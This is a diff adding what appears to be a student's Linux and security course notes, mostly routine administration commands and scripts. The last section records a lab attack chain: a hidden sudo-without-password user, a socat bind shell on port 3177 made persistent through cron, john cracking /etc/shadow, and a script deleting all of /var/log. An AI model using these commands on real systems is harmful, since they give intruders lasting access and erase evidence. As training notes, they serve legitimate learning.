@@ -1,0 +1,293 @@
+pwd 
+cd 
+cd ..
+ls
+ls -l
+ls -al
+mkdir
+rm
+rmdir
+touch
+nano
+clear
+echo
+cat
+grep
+wc
+sudo
+sudo su
+sudo apt-get 
+fping -g -r 3
+nmap -sS 
+nslookup -type=mx 
+steghide extract -sf [image name].jpg
+hashcat -m 0 -a 0 -o solved.txt hash.txt /usr/share/wordlists/rockyou.txt  --force
+
+
+below are some examples of use of some of the commands
+
+
+#!/bin/bash
+# Dealer script
+grep "05:00:00 AM" 0310_Dealer_schedule > 0310_05AM |cat 0310_05AM | awk -F" " '{print$1, $2,$5 ,$6}' > Dealers_working_during_losses
+#
+grep "05:00:00 AM" 0310_Dealer_schedule > 0310_05AM |cat 0310_05AM | awk -F" " '{print$1, $2,$5 ,$6}' > Dealers_working_during_losses
+#
+grep "08:00:00 AM" 0310_Dealer_schedule > 0310_08AM |cat 0310_08AM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "02:00:00 PM" 0310_Dealer_schedule > 0310_02PM |cat 0310_02PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "08:00:00 PM" 0310_Dealer_schedule > 0310_08PM |cat 0310_08PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "11:00:00 PM" 0310_Dealer_schedule > 0310_11PM |cat 0310_11PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "05:00:00 AM" 0312_Dealer_schedule > 0312_05AM |cat 0312_05AM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "08:00:00 AM" 0312_Dealer_schedule > 0312_08AM |cat 0312_08AM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "02:00:00 PM" 0312_Dealer_schedule > 0312_02PM |cat 0312_02PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "08:00:00 PM" 0312_Dealer_schedule > 0312_08PM |cat 0312_08PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "11:00:00 PM" 0312_Dealer_schedule > 0312_11PM |cat 0312_11PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "05:00:00 AM" 0315_Dealer_schedule > 0315_05AM |cat 0315_05AM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "08:00:00 AM" 0315_Dealer_schedule > 0315_08AM |cat 0315_08AM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "02:00:00 PM" 0315_Dealer_schedule > 0315_02PM |cat 0315_02PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+cat *_Dealer_schedule | awk -F" " '{print$1, $2, $5 ,$6}' > Roulette_dealer_finder_by_time_and_game
+
+cat *_Dealer_schedule | awk -F" " '{print$1, $2, $5 ,$6}'
+
+cat *_Dealer_schedule | awk -F" " '{print$1, $2, $3 ,$4}' > Blackjack_dealer_finder_by_time_and_game
+
+cat *_Dealer_schedule | awk -F" " '{print$1, $2, $3 ,$4}'
+
+cat *_Dealer_schedule | awk -F" " '{print$1, $2, $7 ,$8}' > Poker_dealer_finder_by_time_and_game
+
+cat *_Dealer_schedule | awk -F" " '{print$1, $2, $7 ,$8}'   
+
+cat *_Dealer_schedule | awk -F" " '{print$1, $2, $3 ,$4}' > Dealer_finder_time_and_game | cat *_Dealer_schedule | awk -F" " '{print$1, $2, $5 ,$6}' >> Dealer_finder_time_and_game | cat *_Dealer_schedule | awk -F" " '{print$1, $2, $7 ,$8}' >> Dealer_finder_gtime_and_game
+
+dealer script
+#
+#
+#
+grep "05:00:00 AM" 0310_Dealer_schedule > 0310_05AM |cat 0310_05AM | awk -F" " '{print$1, $2,$5 ,$6}' > Dealers_working_during_losses
+
+grep "08:00:00 AM" 0310_Dealer_schedule > 0310_08AM |cat 0310_08AM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "02:00:00 PM" 0310_Dealer_schedule > 0310_02PM |cat 0310_02PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "08:00:00 PM" 0310_Dealer_schedule > 0310_08PM |cat 0310_08PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "11:00:00 PM" 0310_Dealer_schedule > 0310_11PM |cat 0310_11PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+#
+#
+#
+grep "05:00:00 AM" 0312_Dealer_schedule > 0312_05AM |cat 0312_05AM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "08:00:00 AM" 0312_Dealer_schedule > 0312_08AM |cat 0312_08AM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "02:00:00 PM" 0312_Dealer_schedule > 0312_02PM |cat 0312_02PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "08:00:00 PM" 0312_Dealer_schedule > 0312_08PM |cat 0312_08PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "11:00:00 PM" 0312_Dealer_schedule > 0312_11PM |cat 0312_11PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+#
+#
+grep "05:00:00 AM" 0315_Dealer_schedule > 0315_05AM |cat 0315_05AM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "08:00:00 AM" 0315_Dealer_schedule > 0315_08AM |cat 0315_08AM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+grep "02:00:00 PM" 0315_Dealer_schedule > 0315_02PM |cat 0315_02PM | awk -F" " '{print$1, $2,$5 ,$6}' >> Dealers_working_during_losses
+
+
+grep -i Billy 03* | wc -l >> Dealers_working_during_losses
+
+
+
+cd Downloads
+
+mv TarDocs.tar home/Projects
+-----------
+tar
+
+sudo tar -xf TarDocs.tar  --strip=2 TarDocs/Financials/Assests_1
+sudo tar -xf TarDocs.tar  --strip=2 TarDocs/Financials/investment1
+
+sudo mv Assests_1.txt  /home/sysadmin/MyFinacials/
+sudo mv investments1.txt  /home/sysadmin/MyFinacials/
+
+sudo tar -xvf TarDocs.tar
+sudo mv TarDocs /home/sysadmin/MyFinacials/
+
+tar -cvf MyFinancials.tar --exclude=Java TarDocs/
+
+BONUS
+sudo tar -czvf logs_backup.tar.gz --listed-incremental=snaphot.file /var/log
+
+
+------------
+CRON
+
+0 6 * * 3 gzip -t ~/auth_Backup.tgz ~/var/log/auth.log
+
+------------
+touch system.sh
+nano system.sh
+
+#!/bin/bash
+
+#Create New Folders
+mkdir -v -p Backups/{freemem,diskuse,openlist}
+
+2nd Bash Script
+#!/bin/bash
+
+#SYSTEM_2 BASH
+
+#The Memory Info
+echo "Memory Info:"
+free >>/home/sysadmin/Backups/freemem/free_mem.txt
+
+#The Disk Usage
+echo -e "\nDisk Usage:"
+df -H | head -2 >>/home/sysadmin/Backups/diskuse/disk_usage.txt
+
+#Open Files
+echo "Openlist Use:" 
+lsof >>/home/sysadmin/Backups/openlist/openlist.txt
+
+#Print File System Disk Space Stats
+echo "Freedisk:"
+df -h >>/home/sysadmin/Backups/freedisk/freedisk.txt
+
+chmod +x system_2.sh
+
+./system_2.sh
+
+
+---------------------------------------
+journalctl
+
+sudo journalctl -p err -b -0  sudo journalctl -p err -b -1
+
+journalctl --disk-usage -b -0
+
+journalctl -b --since yesterday -r --list-boots --vacuum-files=2
+
+*Bonus 
+
+
+---------------------------------------
+Rysyslog
+sudo nano 50-default.conf 
+
+sudo service rsyslog restart
+
+---------------------------------------
+logrotate
+
+#backs up authentication messages to the /var/log/auth.log directory
+/var/log/auth.log {
+        rotate 7
+        weekly
+        notifempty
+        compress
+        delay compress
+        missingok
+        endscript
+}
+
+
+---------------------------------------
+
+Auditd
+
+sudo apt install auditd -y
+
+sudo systemctl status auditdls -
+
+nano audit.rules
+	## Monitor Shadow and passwd files auth.log
+	-w /etc/shadow -p wra -k hashpass_audit
+	-w /etc/passwd -p wra -k userpass_audit
+	-w /var/log/auth.log -p wra -k authlog_audit
+
+systemctl restart auditd
+
+Sudo auditctrl -l
+
+sudo aureport -au
+
+sudo adduser hacker
+
+
+
+
+
+sudo journalctl -p 0..2 > /home/student/Priority_High.txt
+
+
+sudo useradd --system --no-create sysd
+sudo passwrd sysd
+id sysd
+sudo -l -U sysd
+usermod -u 998 sysd
+groupmod -g 998 sysd
+usermod -aG sudo sysd
+sudo visudo
+sysd     ALL=(ALL) NOPASSWD:ALL
+sudo nano passwd
+
+find sshd_config
+sudo nano sshd_config
+* uncomment and changed 22 to 2222
+sudo systmctl ssh restart
+ssh -p 2222 sysd@192.168.1.105
+
+sudo apt install socat
+socat TCP4-Listen:3177,fork EXEC:/bin/bash &
+fg
+./socat.exe STDIO TCP4:192.168.1.105:3177
+
+ssh -p 2222 sysd@192.168.1.105
+su root
+cd etc/
+ls -a
+john shadow
+john --show shadow
+
+sudo crontab -e
+@reboot socat TCP4-Listen:3177,fork EXEC:/bin/bash &
+for
+touch .Just_Another_Script
+nano .Just_Another_Script
+#!/bin/bash/
+
+#!/bin/bash/
+
+
+#Poof Loggone
+./socat.exe STDIO TCP4:192.168.1.105:3177
+su root
+for file in $(ls /var/log/*);
+do
+	rm -rf $file;
+done
+~
+
+
+
+
+
+
+
+
+
+
+
+
